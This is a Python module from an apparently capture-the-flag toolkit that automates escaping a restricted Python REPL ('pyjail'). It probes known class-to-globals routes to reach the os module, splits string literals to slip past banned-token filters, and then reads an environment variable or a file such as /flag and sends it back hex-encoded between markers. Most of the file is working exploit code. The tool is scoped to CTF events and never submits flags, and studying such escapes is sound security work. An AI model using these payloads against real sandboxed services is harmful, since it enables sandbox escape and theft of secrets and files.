#!/usr/bin/env python3
"""Interactive pyjail escape assembly over a connection (B-051).

Given a *transport* to a restricted CPython REPL -- an object exposing ``request(payload: bytes) ->
bytes`` that returns one framed reply per request -- this driver mechanises the round-trips of an
object-graph escape.  In production the transport is a ``live_harness.Session`` (scope-checked by
``ctf.scope`` through ``pwn_target.PwnTarget`` before any socket opens); with its default ``line``
framing every payload here makes the jail print exactly one ``\\n``-terminated line, so one
``request()`` is one reply.  This module opens no socket of its own.

  1. **recon by in-band probe** -- walk a ladder of known escape routes (``_wrap_close`` -> os
     module dict, ``Popen`` -> ``subprocess.os.__dict__``, ...).  Each probe makes the jail write a
     *fresh* marker (``=PJ<nonce>=``) that is **built at runtime in the jail** from split literals,
     so the contiguous marker never appears in what we send: a jail that echoes the input line, a
     traceback or a ``DENIED: <line>`` banner cannot fake the proof.  A reply is proof only when it
     carries that probe's own marker; a reply that carries an *earlier* probe's marker is a late
     reply and is attributed to the earlier route (and the lag is remembered), never to the current
     one.
  2. **in-band output capture** -- reuse the proven route to read ``environ[<key>]`` (or ``os.read``
     a file) and write it hex-encoded between a fresh start/end marker pair, then slice it out.  Hex
     keeps the reply on one line whatever the secret contains.
  3. **report, never submit** -- scan the captured bytes with the event's flag format and return a
     candidate.  The SubmitGate owns submission.  Every returned byte is data.

Known limit -- one reply per request.  The lag accounting counts *frames* (lines, with the default
``line`` framing) and assumes each request produces exactly one.  A jail that answers a failed probe
with a multi-line traceback shifts the stream by several lines.  Late attribution still names the
right route (a marker is only ever matched to the probe that issued it), but the exploit reply may
then sit further back than ``lag`` frames and is not collected; the result says so loudly ("no
marker-delimited output was captured") and never reports a flag it did not capture.  For such a jail
use a ``prompt`` framing on the Session (one frame per prompt) or restrict ``candidates`` to the
route already proven.

The gadget strings come from :mod:`pyjail_gadgets`; when a :class:`pyjail_gadgets.JailProfile` is
given, its ranking is consulted and a route it blocks is refused loudly rather than sent.  Nothing
here evaluates a payload locally: payloads are bytes sent to the transport.
"""
from __future__ import annotations

import argparse
import binascii
import json
import secrets
import sys
from dataclasses import dataclass, field
from pathlib import Path
from typing import TYPE_CHECKING, Callable, Protocol, Sequence, runtime_checkable

HERE = Path(__file__).resolve().parent
if str(HERE) not in sys.path:
    sys.path.insert(1, str(HERE))
import pyjail_gadgets as pg  # noqa: E402

if TYPE_CHECKING:  # pragma: no cover
    from ctf.event import EventProfile


@dataclass(frozen=True)
class Route:
    """One escape class and how to reach an ``os`` module dict from its ``__init__.__globals__``.

    ``module_key`` is ``None`` when the class is defined in ``os`` itself (its globals *are* the os
    dict); otherwise the globals hold the os module under ``module_key`` and the driver hops through
    ``globals[module_key].__dict__``.  Verified on CPython 3.12: ``subprocess.Popen`` and
    ``asyncio.events.Handle`` carry ``os``, ``tempfile._TemporaryFile*`` carry ``_os``.
    """

    class_name: str
    module_key: str | None = None


# Ordered by how commonly the class is already loaded in a sealed jail.  The driver proves which one
# is live.
CANDIDATE_ROUTES: tuple[Route, ...] = (
    Route("_wrap_close"),                       # os            (warden / 9143)
    Route("Popen", "os"),                       # subprocess
    Route("_TemporaryFileCloser", "_os"),       # tempfile
    Route("_TemporaryFileWrapper", "_os"),      # tempfile
    Route("Handle", "os"),                      # asyncio.events
)
CANDIDATE_CLASSES: tuple[str, ...] = tuple(r.class_name for r in CANDIDATE_ROUTES)
_KNOWN_ROUTES = {r.class_name: r for r in CANDIDATE_ROUTES}

MARKER_PREFIX = "=PJ"
MAX_RESPONSE = 4 * 1024 * 1024
MAX_PROBES = 64
MAX_READ_BYTES = 1 << 20
ENCODINGS = ("hex", "raw")

# The routes this driver drives, as gadget names in pyjail_gadgets.GADGETS: a jail profile that
# blocks any of them makes escape() refuse instead of sending a payload that cannot work.  The route
# to the os dict is shared; the output gadget depends on the objective (``file`` uses os.open, which
# raises the ``open`` audit event).
_DRIVEN_GADGETS = ("subclass-by-name", "init-globals")
_OBJECTIVE_GADGETS = {"env": "environ-write", "file": "os-open-read"}


class EscapeError(RuntimeError):
    """A driver-level failure (no viable route, transport misuse).  Loud, never silent."""


@runtime_checkable
class Transport(Protocol):
    """Minimal duck type: one call sends a payload and returns the service's reply bytes."""

    def request(self, payload: bytes) -> bytes: ...


@dataclass
class EscapeStep:
    kind: str                 # "probe" | "exploit" | "resync"
    class_name: str
    payload: str
    marker_seen: bool
    response_preview: str


@dataclass
class EscapeResult:
    route_class: str | None
    objective: str
    steps: list[EscapeStep] = field(default_factory=list)
    captured: bytes = b""
    flag_candidates: list[str] = field(default_factory=list)
    flag: str | None = None
    flags_scanned: bool = False
    submitted: bool = False     # this driver never submits
    network_used: bool = True
    lag: int = 0                # frames the reply stream was behind, from a late probe reply
    note: str = ""

    def add_note(self, text: str) -> None:
        self.note = f"{self.note}; {text}" if self.note else text

    def as_dict(self) -> dict:
        return {
            "route_class": self.route_class,
            "objective": self.objective,
            "steps": [
                {
                    "kind": step.kind,
                    "class_name": step.class_name,
                    "payload": step.payload,
                    "marker_seen": step.marker_seen,
                    "response_preview": step.response_preview,
                }
                for step in self.steps
            ],
            "captured": self.captured.decode("utf-8", "replace"),
            "flag_candidates": list(self.flag_candidates),
            "flag": self.flag,
            "flags_scanned": self.flags_scanned,
            "submitted": self.submitted,
            "network_used": self.network_used,
            "lag": self.lag,
            "note": self.note,
        }


# --------------------------------------------------------------------------- payload assembly

def _route(candidate: Route | str) -> Route:
    if isinstance(candidate, Route):
        return candidate
    if isinstance(candidate, str) and candidate:
        return _KNOWN_ROUTES.get(candidate, Route(candidate))
    raise EscapeError(f"candidate must be a Route or class name, got {candidate!r}")


def os_dict_expr(route: Route, banned: Sequence[str] = ()) -> str:
    """Source for the ``os`` module dict reached through ``route`` (ban-evaded literals)."""
    globals_expr = pg.module_globals(pg.select_class(route.class_name, banned=banned))
    if route.module_key is None:
        return globals_expr
    return f"{globals_expr}[{pg.literal_expr(route.module_key, banned)}].__dict__"


def marker_expr(marker: str, banned: Sequence[str] = ()) -> str:
    """A bytes expression that evaluates to ``marker`` in the jail but never spells it contiguously.

    The marker itself is treated as a banned token, so :func:`pyjail_gadgets.split_literal` must cut
    inside it: the source carries ``b'='+b'PJ..='``, and only evaluation joins it.
    """
    parts = pg.split_literal(marker, tuple(banned) + (marker,))
    return "+".join(repr(part.encode("ascii")) for part in parts)


def probe_payload(route: Route, marker: str, banned: Sequence[str] = ()) -> str:
    """``x=<os dict>;x['write'](1,<marker built in-jail>+b'\\n')``."""
    write_key = pg.literal_expr("write", banned)
    return f"x={os_dict_expr(route, banned)};x[{write_key}](1,{marker_expr(marker, banned)}+b'\\n')"


def exploit_payload(route: Route, objective: str, start: str, end: str, *, env_key: str = "FLAG",
                    path: str = "/flag", read_bytes: int = 4096, encoding: str = "hex",
                    banned: Sequence[str] = ()) -> str:
    """Read ``environ[env_key]`` or ``os.read(os.open(path,0),n)`` and write it between markers."""
    if objective not in {"env", "file"}:
        raise EscapeError("objective must be 'env' or 'file'")
    if encoding not in ENCODINGS:
        raise EscapeError(f"encoding must be one of {ENCODINGS}")
    if not isinstance(read_bytes, int) or isinstance(read_bytes, bool) or not 1 <= read_bytes <= MAX_READ_BYTES:
        raise EscapeError(f"read_bytes must be 1..{MAX_READ_BYTES}")
    write_key = pg.literal_expr("write", banned)
    if objective == "env":
        value = f"x[{pg.literal_expr('environ', banned)}][{pg.literal_expr(env_key, banned)}].encode()"
    else:
        open_key = pg.literal_expr("open", banned)
        read_key = pg.literal_expr("read", banned)
        value = f"x[{read_key}](x[{open_key}]({pg.literal_expr(path, banned)},0),{read_bytes})"
    if encoding == "hex":
        value = f"{value}.hex().encode()"
    return (f"x={os_dict_expr(route, banned)};"
            f"x[{write_key}](1,{marker_expr(start, banned)}+{value}+{marker_expr(end, banned)}+b'\\n')")


def _assert_clean(payload: str, banned: Sequence[str], what: str) -> None:
    """A payload that still spells a banned token is certain to be denied: refuse it loudly."""
    low = payload.lower()
    left = [tok for tok in banned if tok and tok.lower() in low]
    if left:
        raise EscapeError(f"{what} still contains banned token(s) {left!r} outside ban-evadable "
                          f"literals (an attribute name such as __init__/__globals__/__dict__/hex/"
                          f"encode cannot be split); this route cannot pass the jail's denylist")


# --------------------------------------------------------------------------- transport helpers

def _send(transport: Transport | Callable[[bytes], bytes], payload: str) -> bytes:
    if not isinstance(payload, str) or not payload:
        raise EscapeError("payload must be a non-empty string")
    data = payload.encode("utf-8")
    if hasattr(transport, "request"):
        reply = transport.request(data)
    elif callable(transport):
        reply = transport(data)
    else:
        raise EscapeError("transport must expose request(bytes)->bytes or be callable")
    return _check_reply(reply)


def _check_reply(reply) -> bytes:
    if not isinstance(reply, (bytes, bytearray)):
        raise EscapeError("transport returned non-bytes")
    reply = bytes(reply)
    if len(reply) > MAX_RESPONSE:
        raise EscapeError("transport response exceeds bound")
    return reply


def _read_next(transport) -> bytes | None:
    """Read one more framed reply without sending, when the transport can (Session.banner())."""
    reader = getattr(transport, "banner", None)
    if not callable(reader):
        return None
    return _check_reply(reader())


def _extract_between(data: bytes, start: bytes, end: bytes) -> bytes | None:
    first = data.find(start)
    if first < 0:
        return None
    begin = first + len(start)
    stop = data.find(end, begin)
    if stop < 0:
        return None
    return data[begin:stop]


def _preview(data: bytes, limit: int = 160) -> str:
    return data.decode("utf-8", "replace")[:limit]


def _default_nonce() -> str:
    return secrets.token_hex(6)


class _Markers:
    """Issues this run's markers: ``=PJ<tag><nonce>=``.

    The tag (probe index, ``S``, ``E``) makes every marker distinct within a run whatever the nonce
    source returns; the random nonce makes runs on one connection distinct from each other, so a
    stale reply from an earlier run cannot prove a route in this one.
    """

    def __init__(self, nonce: Callable[[], str]):
        self._nonce = nonce

    def new(self, tag: str) -> str:
        token = self._nonce()
        if not isinstance(token, str) or not token or not token.isalnum() or not token.isascii() \
                or len(token) > 32:
            raise EscapeError("nonce source must return 1..32 ASCII alphanumeric characters")
        return f"{MARKER_PREFIX}{tag}{token}="


# --------------------------------------------------------------------------- the driver

def _check_jail(jail: pg.JailProfile | None, objective: str) -> tuple[str, ...]:
    """Refuse a route or output gadget the jail profile blocks; return its banned substrings."""
    if jail is None:
        return ()
    if not isinstance(jail, pg.JailProfile):
        raise EscapeError("jail must be a pyjail_gadgets.JailProfile")
    rows = {row["name"]: row for row in pg.rank(jail)}
    blocked = [f"{name}: {'; '.join(rows[name]['reasons'])}"
               for name in _DRIVEN_GADGETS if not rows[name]["usable"]]
    if blocked:
        raise EscapeError("the jail profile blocks the subclass/__globals__ route this driver uses -- "
                          + " | ".join(blocked)
                          + " (use pyjail_gadgets.rank() to pick another route, e.g. the frame walk)")
    output = _OBJECTIVE_GADGETS[objective]
    if not rows[output]["usable"]:
        raise EscapeError(f"the jail profile blocks the {objective!r} objective's output gadget -- "
                          f"{output}: {'; '.join(rows[output]['reasons'])}"
                          + (" (try objective='env')" if objective == "file" else ""))
    return tuple(jail.banned_substrings)


def escape(
    transport: Transport | Callable[[bytes], bytes],
    *,
    profile: "EventProfile | None",
    objective: str = "env",
    env_key: str = "FLAG",
    path: str = "/flag",
    read_bytes: int = 4096,
    candidates: Sequence[Route | str] = CANDIDATE_ROUTES,
    banned: Sequence[str] = (),
    jail: pg.JailProfile | None = None,
    encoding: str = "hex",
    nonce: Callable[[], str] = _default_nonce,
) -> EscapeResult:
    """Drive an object-graph escape over ``transport`` and return a flag *candidate* (never submitted).

    ``profile`` is the event profile whose flag format the captured bytes are scanned with; it is
    required (pass ``None`` explicitly to skip the scan, which the result then says).  ``jail`` is
    what is known about the jail (``pyjail_gadgets.JailProfile``): its banned substrings are evaded
    and a route its ranking blocks is refused.  ``objective`` is ``"env"`` (``environ[env_key]``) or
    ``"file"`` (``os.read(os.open(path, 0), read_bytes)``).
    """
    if objective not in {"env", "file"}:
        raise EscapeError("objective must be 'env' or 'file'")
    if encoding not in ENCODINGS:
        raise EscapeError(f"encoding must be one of {ENCODINGS}")
    routes = [_route(c) for c in candidates]
    if not routes or len(routes) > MAX_PROBES:
        raise EscapeError("candidate route ladder must be 1..%d entries" % MAX_PROBES)
    banned = tuple(banned) + _check_jail(jail, objective)
    markers = _Markers(nonce)

    result = EscapeResult(route_class=None, objective=objective)
    route: Route | None = None

    # Phase 1: prove a live route.  Each probe has its own marker; earlier markers stay watched.
    issued: list[tuple[Route, bytes]] = []
    for index, cand in enumerate(routes):
        marker = markers.new(f"{index:02d}")
        payload = probe_payload(cand, marker, banned)
        _assert_clean(payload, banned, f"probe for {cand.class_name}")
        issued.append((cand, marker.encode("ascii")))
        reply = _send(transport, payload)
        own = issued[-1][1] in reply
        result.steps.append(EscapeStep("probe", cand.class_name, payload, own, _preview(reply)))
        if own:
            route = cand
            break
        late = [(j, r) for j, (r, m) in enumerate(issued[:-1]) if m in reply]
        if late:
            j, route = late[0]
            result.lag = index - j
            result.add_note(f"late reply: probe {index} ({cand.class_name}) received the marker of "
                            f"probe {j} ({route.class_name}); the stream is {result.lag} reply(ies) behind")
            break

    if route is None:
        result.add_note("no candidate class produced a live __init__.__globals__ write route")
        _scan(result, profile)
        return result
    result.route_class = route.class_name

    # Phase 2: reuse the proven route to exfiltrate the target between fresh markers.
    start = markers.new("S")
    end = markers.new("E")
    payload = exploit_payload(route, objective, start, end, env_key=env_key, path=path,
                              read_bytes=read_bytes, encoding=encoding, banned=banned)
    _assert_clean(payload, banned, "exploit payload")
    reply = _send(transport, payload)
    start_b, end_b = start.encode("ascii"), end.encode("ascii")
    captured = _extract_between(reply, start_b, end_b)
    result.steps.append(EscapeStep("exploit", route.class_name, payload, captured is not None,
                                   _preview(reply)))
    # A lagging stream owes us `lag` more replies; read exactly those (no timing guess).
    for _ in range(result.lag):
        if captured is not None:
            break
        more = _read_next(transport)
        if more is None:
            result.add_note("stream is behind but the transport cannot read without sending "
                            "(no banner()); exploit reply not collected")
            break
        captured = _extract_between(more, start_b, end_b)
        result.steps.append(EscapeStep("resync", route.class_name, "", captured is not None,
                                       _preview(more)))
        reply = more
    if captured is None:
        result.captured = reply
        result.add_note("exploit payload sent but no marker-delimited output was captured")
        if result.lag:
            result.add_note("the lag is counted in frames; a jail that prints multi-frame errors "
                            "(tracebacks) shifts the stream further -- retry with a prompt framing "
                            "or only the proven route on a fresh connection")
    elif encoding == "hex":
        try:
            result.captured = binascii.unhexlify(captured.strip())
        except (binascii.Error, ValueError):
            result.captured = captured
            result.add_note("marker-delimited output was not valid hex; kept as received")
    else:
        result.captured = captured

    _scan(result, profile)
    return result


def _scan(result: EscapeResult, profile) -> None:
    """Phase 3: report flag candidates from captured bytes; never submit."""
    if profile is None:
        result.add_note("flag format not checked: no event profile given")
        return
    from ctf import flagfmt  # the event layer is part of this repo; an import failure is a real error
    result.flag_candidates = list(flagfmt.find_flags(result.captured.decode("utf-8", "replace"), profile))
    result.flags_scanned = True
    if result.flag_candidates:
        result.flag = result.flag_candidates[0]


# --------------------------------------------------------------------------- CLI (offline dry-run)

class _ArgumentParser(argparse.ArgumentParser):
    def error(self, message: str) -> None:  # pragma: no cover
        raise EscapeError(message)


def main(argv: list[str] | None = None) -> int:
    """Offline dry-run: print the payloads the driver *would* send.  Opens no connection."""
    parser = _ArgumentParser(
        description="print the escape payloads an interactive run would send (no connection)")
    parser.add_argument("--objective", choices=("env", "file"), default="env")
    parser.add_argument("--env-key", default="FLAG")
    parser.add_argument("--path", default="/flag")
    parser.add_argument("--class-name", action="append", default=[],
                        help="restrict the candidate class ladder (repeatable)")
    parser.add_argument("--ban-substr", action="append", default=[])
    parser.add_argument("--encoding", choices=ENCODINGS, default="hex")
    parser.add_argument("--json", action="store_true")
    try:
        args = parser.parse_args(argv)
        banned = tuple(args.ban_substr)
        routes = [_route(n) for n in args.class_name] or list(CANDIDATE_ROUTES)
        markers = _Markers(_default_nonce)
        plan = []
        for index, route in enumerate(routes):
            payload = probe_payload(route, markers.new(f"{index:02d}"), banned)
            _assert_clean(payload, banned, f"probe for {route.class_name}")
            plan.append({"class_name": route.class_name, "kind": "probe", "payload": payload})
        exploit = exploit_payload(routes[0], args.objective, markers.new("S"), markers.new("E"),
                                  env_key=args.env_key, path=args.path, encoding=args.encoding,
                                  banned=banned)
        _assert_clean(exploit, banned, "exploit payload")
        plan.append({"class_name": routes[0].class_name, "kind": "exploit", "payload": exploit})
        if args.json:
            print(json.dumps({"objective": args.objective, "plan": plan}, indent=2))
        else:
            print("Interactive pyjail escape plan (dry-run; opens no connection):")
            for row in plan:
                print(f"  [{row['kind']}] via {row['class_name']}")
                print(f"    {row['payload']}")
        return 0
    except (EscapeError, pg.GadgetError) as exc:
        print(f"pyjail_interactive: {exc}", file=sys.stderr)
        return 2


if __name__ == "__main__":  # pragma: no cover
    raise SystemExit(main())


__all__ = [
    "EscapeError",
    "Transport",
    "Route",
    "EscapeResult",
    "EscapeStep",
    "CANDIDATE_ROUTES",
    "CANDIDATE_CLASSES",
    "MARKER_PREFIX",
    "os_dict_expr",
    "marker_expr",
    "probe_payload",
    "exploit_payload",
    "escape",
]
